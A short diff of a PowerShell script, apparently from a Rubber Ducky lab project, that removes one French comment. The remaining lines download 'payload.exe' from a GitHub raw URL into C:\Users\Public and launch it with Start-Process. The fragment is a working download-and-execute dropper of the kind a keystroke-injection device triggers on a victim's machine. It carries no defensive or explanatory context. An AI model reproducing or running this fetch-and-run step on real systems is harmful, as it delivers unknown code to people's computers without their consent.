@@ -6,7 +6,6 @@ $payloadPath = "C:\Users\Public\payload.exe"
 Write-Host "Téléchargement du payload..." -ForegroundColor Yellow
 Invoke-WebRequest -Uri 'https://github.com/L4Curtis/rubberduckyTP/raw/main/payload.exe' -OutFile $payloadPath
 
-# Exécution du payload
 Write-Host "Exécution du payload..." -ForegroundColor Yellow
 Start-Process $payloadPath
 
